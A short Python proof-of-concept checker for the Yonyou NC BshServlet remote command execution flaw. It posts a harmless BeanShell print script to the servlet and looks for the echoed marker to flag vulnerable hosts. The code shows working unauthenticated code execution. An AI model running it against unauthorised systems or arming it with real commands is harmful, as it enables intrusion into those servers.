import requests
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/servlet/~ic/bsh.servlet.BshServlet'
        data = "bsh.script=print%28%22202cb962ac59075b964b07152d234b70%21%22%29%3B%0D%0A"
        req = requests.post(url,headers=headers,data=data)
        if "202cb962ac59075b964b07152d234b70" in req.text and req.status_code == 200:
            print("\033[0;31m 存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞："+ url )
    except:
        pass


